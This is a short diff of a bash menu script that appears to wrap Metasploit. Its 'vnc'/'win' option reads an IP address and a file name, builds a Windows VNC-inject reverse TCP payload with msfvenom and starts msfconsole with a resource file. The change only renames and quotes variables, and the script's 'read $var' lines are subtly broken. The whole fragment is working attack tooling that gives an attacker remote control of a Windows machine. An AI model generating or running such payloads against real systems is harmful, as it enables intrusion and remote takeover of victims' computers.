@@ -114,10 +114,10 @@ fi
 if [[ "$f" == '5' || "$f" == 'fifth' || "$f" == 'vnc' || "$f" == 'win' ]];
 then
 echo "ip address: "
-read $i2
+read $ig
 echo "name: "
-read $n2
-msfvenom -p windows/vncinject/reverse_tcp lhost=$i2 lport=24 X>$n2
+read $n
+msfvenom -p windows/vncinject/reverse_tcp lhost="$ig" lport=24 X>"$n"
 msfconsole -r win_vnc.rc
 fi
 
